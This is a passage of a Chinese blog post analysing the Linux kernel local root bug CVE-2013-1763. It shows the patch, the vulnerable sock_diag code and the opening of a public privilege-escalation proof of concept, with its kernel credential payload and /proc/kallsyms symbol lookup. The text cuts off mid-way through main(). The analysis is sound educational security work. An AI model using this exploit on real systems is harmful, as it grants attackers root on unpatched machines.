<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析 | Frank&#39;s Blog</title>
  <meta name="keywords" content=" linux CVE-2013-1763 漏洞 ">
  <meta name="description" content="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析 | Frank&#39;s Blog">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troublesho">
<meta property="og:type" content="article">
<meta property="og:title" content="Hello World">
<meta property="og:url" content="https://fengguoqing.github.io/2017/11/25/hello-world/index.html">
<meta property="og:site_name" content="Frank&#39;s Blog">
<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2017-11-25T10:37:26.059Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hello World">
<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">


<link rel="icon" href="/img/avatar.jpg">

<link rel="stylesheet" href="/css/style.css">

<link rel="stylesheet" href="/css/hl_theme/atom-dark.css">

<link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>


</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="true">
</div>
<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>Frank Feng</span>
</div>
<div class="icon">
    
    <a class="rss" title="rss" href="/atom.xml" target="_blank"></a>
    
    
    <a class="github" title="github" href="https://github.com/fengguoqing" target="_blank"></a>
    
    
    
    
    
    
    
    <a class="weibo" title="weibo" href="https://weibo.com/1786812385" target="_blank"></a>
    
    
    <a class="email" title="email" href="mailto:fengguoqing611@gmail.com"></a>
    
</div>
<ul>
    <li class="all active">全部文章</li>
    
    <li data-rel="安全"> 安全 </li>
    
    <li data-rel="其他"> 其他 </li>
    
</ul>
<div class="left-bottom">
    <a class="about" href="/about">关于</a><a class="friends">友链</a>
</div>
<input type="hidden" id="yelog_site_posts_number" value="17">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>
    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        友情链接
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode==13){return false;}">
        <input class="search" type="text" placeholder="Search..." autocomplete="off">
        <i class="cross"></i>
        <span>
        <label for="tagswitch">Tags:</label>
        <input id="tagswitch" type="checkbox">
    </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">功耗</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">linux移植</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">日常记录</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">教程</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">linux CVE-2013-1763 漏洞</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">redmine</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">系统安全</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">Linux内核调试</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    <nav>
        
        <a  class=""
           href="/2013/01/12/ACPI-DEBUG方法/"
           data-tag="功耗"
           data-author="" >
            <span class="post-title" title="ACPI DEBUG方法">ACPI DEBUG方法</span>
            <span class="post-date" title="2013-01-12 23:56:24">2013/01/12</span>
        </a>
        
        <a  class=""
           href="/2013/01/10/ACPI规范阅读笔记/"
           data-tag="功耗"
           data-author="" >
            <span class="post-title" title="ACPI规范阅读笔记">ACPI规范阅读笔记</span>
            <span class="post-date" title="2013-01-10 22:09:58">2013/01/10</span>
        </a>
        
        <a  class=""
           href="/2014/04/14/Linux-kernel-make-menuconfig-时出错处理方法/"
           data-tag="linux移植"
           data-author="" >
            <span class="post-title" title="Linux kernel make menuconfig 时出错处理方法">Linux kernel make menuconfig 时出错处理方法</span>
            <span class="post-date" title="2014-04-14 17:53:42">2014/04/14</span>
        </a>
        
        <a  class=""
           href="/2013/11/07/Ubuntu默认启动到文本界面/"
           data-tag="日常记录"
           data-author="" >
            <span class="post-title" title="Ubuntu默认启动到文本界面">Ubuntu默认启动到文本界面</span>
            <span class="post-date" title="2013-11-07 10:50:18">2013/11/07</span>
        </a>
        
        <a  class=""
           href="/2017/11/25/hello-world/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Hello World">Hello World</span>
            <span class="post-date" title="2017-11-25 21:44:08">2017/11/25</span>
        </a>
        
        <a  class=""
           href="/2013/01/13/how-to-install-PostgreSQL-on-ubuntu/"
           data-tag="教程"
           data-author="" >
            <span class="post-title" title="how to install PostgreSQL on ubuntu">how to install PostgreSQL on ubuntu</span>
            <span class="post-date" title="2013-01-13 00:29:56">2013/01/13</span>
        </a>
        
        <a  class="安全 "
           href="/2016/09/04/linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析/"
           data-tag="linux CVE-2013-1763 漏洞"
           data-author="" >
            <span class="post-title" title="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析">linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</span>
            <span class="post-date" title="2016-09-04 20:52:20">2016/09/04</span>
        </a>
        
        <a  class=""
           href="/2013/01/12/mini2440基于uboot的TFTP下载教程/"
           data-tag="教程"
           data-author="" >
            <span class="post-title" title="mini2440基于uboot的TFTP下载教程">mini2440基于uboot的TFTP下载教程</span>
            <span class="post-date" title="2013-01-12 00:04:34">2013/01/12</span>
        </a>
        
        <a  class="其他 "
           href="/2014/04/20/在ubuntu上安装redmine/"
           data-tag="redmine"
           data-author="" >
            <span class="post-title" title="在ubuntu上安装redmine">在ubuntu上安装redmine</span>
            <span class="post-date" title="2014-04-20 16:33:52">2014/04/20</span>
        </a>
        
        <a  class=""
           href="/2013/11/02/基于linux-3-10的yaffs2移植/"
           data-tag="linux移植"
           data-author="" >
            <span class="post-title" title="基于linux 3.10的yaffs2移植">基于linux 3.10的yaffs2移植</span>
            <span class="post-date" title="2013-11-02 13:07:41">2013/11/02</span>
        </a>
        
        <a  class=""
           href="/2013/08/29/如何架设Git服务器/"
           data-tag="教程"
           data-author="" >
            <span class="post-title" title="如何架设Git服务器">如何架设Git服务器</span>
            <span class="post-date" title="2013-08-29 10:49:10">2013/08/29</span>
        </a>
        
        <a  class=""
           href="/2013/06/22/建立网站的一般步骤/"
           data-tag="教程"
           data-author="" >
            <span class="post-title" title="建立网站的一般步骤">建立网站的一般步骤</span>
            <span class="post-date" title="2013-06-22 20:22:22">2013/06/22</span>
        </a>
        
        <a  class=""
           href="/2014/01/19/某些TP-Link路由器可以被远程获取密码/"
           data-tag="系统安全"
           data-author="" >
            <span class="post-title" title="某些TP-Link路由器可以被远程获取密码">某些TP-Link路由器可以被远程获取密码</span>
            <span class="post-date" title="2014-01-19 17:59:38">2014/01/19</span>
        </a>
        
        <a  class=""
           href="/2013/12/02/生成和打上patch的方法/"
           data-tag="教程"
           data-author="" >
            <span class="post-title" title="生成和打上patch的方法">生成和打上patch的方法</span>
            <span class="post-date" title="2013-12-02 13:24:16">2013/12/02</span>
        </a>
        
        <a  class=""
           href="/2013/02/08/笔记本使用手机流量上网/"
           data-tag="教程"
           data-author="" >
            <span class="post-title" title="笔记本使用手机流量上网">笔记本使用手机流量上网</span>
            <span class="post-date" title="2013-02-08 23:22:49">2013/02/08</span>
        </a>
        
        <a  class=""
           href="/2014/02/15/解决三星手机WIFI“此网络不可用。证书已到期”方法/"
           data-tag="日常记录"
           data-author="" >
            <span class="post-title" title="解决三星手机WIFI“此网络不可用。证书已到期”方法">解决三星手机WIFI“此网络不可用。证书已到期”方法</span>
            <span class="post-date" title="2014-02-15 18:11:22">2014/02/15</span>
        </a>
        
        <a  class=""
           href="/2013/03/12/Linux内核调试方法总结/"
           data-tag="Linux内核调试"
           data-author="" >
            <span class="post-title" title="Linux内核调试方法总结">Linux内核调试方法总结</span>
            <span class="post-date" title="2013-03-12 16:25:59">2013/03/12</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            
            <a href="javascript:" data-rel="安全">安全</a>
            
        </span>
        
        
        <span class="tag">
            
            <a href="javascript:" class="color3">linux CVE-2013-1763 漏洞</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title='更新时间: 2017-11-26 09:53:26'>2016-09-04 20:52</time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="跳转至评论区">
            <a href="#comments">
                评论:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析"><span class="toc-text">linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-漏洞描述"><span class="toc-text">1. 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-漏洞的影响范围"><span class="toc-text">2. 漏洞的影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-漏洞曝光时间"><span class="toc-text">3. 漏洞曝光时间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-漏洞产生的原因"><span class="toc-text">4. 漏洞产生的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-漏洞的利用"><span class="toc-text">5. 漏洞的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-exploit代码分析"><span class="toc-text">6. exploit代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-参考网站"><span class="toc-text">7. 参考网站</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析"><a href="#linux-kernel-本地提权漏洞CVE-2013-1763-exploit-代码分析" class="headerlink" title="linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析"></a>linux kernel 本地提权漏洞CVE-2013-1763 exploit 代码分析</h1><p>kernel 最近出了一个新的本地提权安全漏洞CVE-2013-1763，影响范围比较广泛，ubuntu，Arch，fedora都受到其影响，漏洞刚公布就有牛人发布了利用该漏洞获取root权限的攻击代码，下面会分析该代码是如何获取root权限的。</p>
<p>首先对CVE-2013-1763这个安全漏洞简单介绍一下。</p>
<h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>在<code>net/core/sock_diag.c</code>中，<code>__sock_diag_rcv_msg</code>函数未对<code>sock_diag_handlers</code>数组传入的下标做边界检查，导致可能越界，进而导致可执行代码的漏洞。没有root权限的用户可以利用该漏洞获取到root权限。</p>
<h2 id="2-漏洞的影响范围"><a href="#2-漏洞的影响范围" class="headerlink" title="2. 漏洞的影响范围"></a>2. 漏洞的影响范围</h2><p><strong>linux kernel 3.0-3.7.10</strong></p>
<h2 id="3-漏洞曝光时间"><a href="#3-漏洞曝光时间" class="headerlink" title="3. 漏洞曝光时间"></a>3. 漏洞曝光时间</h2><p><strong>2013/02/19</strong></p>
<h2 id="4-漏洞产生的原因"><a href="#4-漏洞产生的原因" class="headerlink" title="4. 漏洞产生的原因"></a>4. 漏洞产生的原因</h2><p>首先看一下这个漏洞的patch：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net/core/sock_diag.c View file @ <span class="number">6e601</span>a5</span><br><span class="line">@@ <span class="number">-121</span>,<span class="number">6</span> +<span class="number">121</span>,<span class="number">9</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)</span><br><span class="line">   <span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(*req))</span><br><span class="line">     <span class="keyword">return</span> -EINVAL;</span><br><span class="line"> </span><br><span class="line">+  <span class="keyword">if</span> (req-&gt;sdiag_family &gt;= AF_MAX)</span><br><span class="line">+    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">+</span><br><span class="line">   hndl = sock_diag_lock_handler(req-&gt;sdiag_family);</span><br><span class="line">   <span class="keyword">if</span> (hndl == <span class="literal">NULL</span>)</span><br><span class="line">     err = -ENOENT;</span><br></pre></td></tr></table></figure></p>
<p>Patch 很简单，只是加上了数组边界判断而已。那么在看看<code>sock_diag_lock_hander</code>这个函数做了些什么：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">inline</span> struct sock_diag_handler *<span class="title">sock_diag_lock_handler</span><span class="params">(<span class="keyword">int</span> family)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sock_diag_handlers[family] == <span class="literal">NULL</span>)</span><br><span class="line">                request_module(<span class="string">"net-pf-%d-proto-%d-type-%d"</span>, PF_NETLINK,</span><br><span class="line">                                NETLINK_SOCK_DIAG, family);</span><br><span class="line"></span><br><span class="line">        mutex_lock(&amp;sock_diag_table_mutex);</span><br><span class="line">        <span class="keyword">return</span> sock_diag_handlers[family];<span class="comment">//这个函数没有对传入的family的值的范围,进行验证,从而造成数组越界.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个函数也没有做什么，只是对 <code>sock_diag_lock_hander[family]</code>进行检测，是否为NULL，如果为NULL申请注册，然后加上了一把锁，最后返回的是它的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_handler</span> *<span class="title">sock_diag_handlers</span>[<span class="title">AF_MAX</span>];</span>  <span class="comment">//可以看出,这个指针数组最大为AF_MAX AF_MAX = 40.</span></span><br></pre></td></tr></table></figure>
<p>接着我们再看看完整的<code>__sock_diag_rcv_msg</code>函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_req</span> *<span class="title">req</span> = <span class="title">NLMSG_DATA</span>(<span class="title">nlh</span>);</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_diag_handler</span> *<span class="title">hndl</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(*req))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    hndl = sock_diag_lock_handler(req-&gt;sdiag_family);<span class="comment">//这里传入sdiag_family的值,然后返回数组指针sock_diag_handlers[reg-&gt;sdiag_family].由于没有做边界判断，那么就可以越界。</span></span><br><span class="line">    <span class="keyword">if</span> (hndl == <span class="literal">NULL</span>)</span><br><span class="line">        err = -ENOENT;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = hndl-&gt;dump(skb, nlh); <span class="comment">//看到这里是不是很激动呢，利用这里可以让它执行我们自己的代码</span></span><br><span class="line">    sock_diag_unlock_handler(hndl);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="5-漏洞的利用"><a href="#5-漏洞的利用" class="headerlink" title="5. 漏洞的利用"></a>5. 漏洞的利用</h2><p>虽然已经找到了kernel中有这样一个漏洞，但是如何利用这个漏洞来执行我们自己的程序，取得root权限还是需要很困难的，需要对kernel系统以及计算机运行原理非常了解才可以，并且这些程序往往需要精细设计才能达到最终的目的。 下面是某牛人写的exploit代码，请欣赏：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* quick'n'dirty poc for CVE-2013-1763 SOCK_DIAG bug in kernel 3.3-3.8</span></span><br><span class="line"><span class="comment">* bug found by Spender</span></span><br><span class="line"><span class="comment">* poc by SynQ</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* hard-coded for 3.5.0-17-generic #28-Ubuntu SMP Tue Oct 9 19:32:08 UTC 2012 i686 i686 i686 GNU/Linux</span></span><br><span class="line"><span class="comment">* using nl_table-&gt;hash.rehash_time, index 81</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* Fedora 18 support added</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* 2/2013</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sock_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/inet_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unix_diag.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sock_diag_handlers, nl_table;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>)))    <span class="comment">//这是指示GCC编译器选用3个寄存器代替堆栈来传递参数。</span></span><br><span class="line">kernel_code()</span><br><span class="line">&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));  <span class="comment">//这行代码执行之后就可以获取root权限，但是这两个函数都是内核函数，必须在内核态执行才有效。</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这段函数没有使用，用来解释hard code jump[] 为什么是那些数值</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">jump_payload_not_used</span><span class="params">(<span class="keyword">void</span> *skb, <span class="keyword">void</span> *nlh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"mov $kernel_code, %eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="string">"call *%eax\n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">  )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span></span><br><span class="line">get_symbol(<span class="keyword">char</span> *name)  <span class="comment">//为了获取内核函数地址</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *f;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr;</span><br><span class="line">  <span class="keyword">char</span> dummy, sym[<span class="number">512</span>];</span><br><span class="line">  <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  f = fopen(<span class="string">"/proc/kallsyms"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">while</span> (ret != EOF) &#123;</span><br><span class="line">    ret = <span class="built_in">fscanf</span>(f, <span class="string">"%p %c %s\n"</span>, (<span class="keyword">void</span> **) &amp;addr, &amp;dummy, sym);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">fscanf</span>(f, <span class="string">"%s\n"</span>, sym);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, sym)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[+] resolved symbol %s to %p\n"</span>, name, (<span class="keyword">void</span> *) addr);</span><br><span class="line">      fclose(f);</span><br><span class="line">      <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(f);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>*argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">unsigned</span> family;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> <span class="title">nlh</span>;</span>  <span class="comment">//socket协议netlink数据包的格式</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">unix_diag_req</span> <span class="title">r</span>;</span></span><br><span class="line">  &#125; req;</span><br><span class="line">  <span class="keyword">char</span>  buf[<span class="number">8192</span>];</span><br><span class="line"></span><br><span class="line">    